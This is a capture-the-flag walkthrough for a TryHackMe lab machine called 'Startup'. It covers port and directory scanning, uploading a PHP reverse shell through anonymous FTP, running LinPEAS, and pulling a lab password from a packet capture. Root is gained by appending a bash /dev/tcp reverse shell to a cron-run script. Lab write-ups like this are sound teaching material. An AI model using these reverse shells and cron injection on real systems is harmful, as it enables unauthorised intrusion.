# [Startup](https://tryhackme.com/room/startup)

## Abuse traditional vulnerabilities via untraditional means.

# Welcome to Spice Hut!

**We are Spice Hut**, a new startup company that just made it big! We offer a variety of spices and club sandwiches (in case you get hungry), but that is not why you are here. To be truthful, we aren't sure if our developers know what they are doing and our security concerns are rising. We ask that you perform a thorough penetration test and try to own root. Good luck!

### What is the secret spicy soup recipe?

_FTP and HTTP. What could possibly go wrong?_

1. Perform a comprehensive port scan to identify all open ports and running services on the target machine:

```bash
nmap -sV -p- <TARGET_IP>
```

**Results:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

2. Verify if the FTP server allows anonymous login:

```bash
ftp <TARGET_IP>
anonymous
ls -la
```

3. Use Gobuster to discover hidden directories and files on the web server:

```bash
gobuster dir -u <TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt -t 50
```

**Results**

```
/files                (Status: 301) [Size: 314] [--> http://<TARGET_IP>/files/]
/server-status        (Status: 403) [Size: 278]
```

4. Create a PHP reverse shell file named `shell.php`:

```php
<?php
$ip = '<ATTACKER_IP>';
$port = 4444;

$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

5. On your attack machine, start a netcat listener to catch the incoming reverse shell:

```bash
nc -lvnp 4444
```

6. Connect to the FTP server and upload your reverse shell:

```bash
cd ftp
put shell.php
```

7. Navigate to `http://<TARGET_IP>/files/ftp/shell.php` in your browser to execute the PHP script.

8. On your attack machine, download LinPEAS and upload it via FTP:

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
```

```bash
cd ftp
put linpeas.sh
```

9. Back in your reverse shell:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cd /var/www/html/files/ftp
./linpeas.sh
```

**Results:**

```
╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/incidents
/incidents/suspicious.pcapng
/recipe.txt
/run/cloud-init/tmp
/run/lock
/run/lock/apache2
/run/screen/S-www-data
/tmp
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/tmp/.font-unix
```

10. Read the contents of the recipe file:

```bash
cat /recipe.txt
```

[SCREEN01]

---

### What are the contents of user.txt?

_Something doesn't belong._

1. Copy the suspicious packet capture to the web-accessible directory:

```bash
cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
```

2. Download the file from `http://<TARGET_IP>/files/ftp/suspicious.pcapng` to your attack machine. Open the file with Wireshark.

3. Apply the display filter to isolate reverse shell traffic:

```
tcp.port == 4444
```

Right-click any packet in the filtered results > **Follow** > **TCP Stream**

[SCREEN02]

4. Back in your reverse shell, use the discovered credentials:

```bash
su - lennie
# Password: c4ntg3t3n0ughsp1c3
```

5. Retrieve the User Flag

```bash
cat cat user.txt
```

[SCREEN03]

---

### What are the contents of root.txt?

_Scripts..._

1. Explore Lennie's Home Directory

```bash
ls -la /home/lennie/scripts
cat /home/lennie/scripts/planner.sh
```

**Results:**

```bash
#!/bin/bash
echo $LIST > /home/lennie/scripts/startup_list.txt
/etc/print.sh
```

2. On your attack machine, start a fresh netcat listener for the root shell:

```bash
nc -lvnp 4444
```

3. Add a bash reverse shell to the print script:

```bash
echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' >> /etc/print.sh
```

4. The cron job typically runs every minute. Wait (1-2 minutes) for the scheduled execution.

```bash
cat /root/root.txt
```

[SCREEN04]
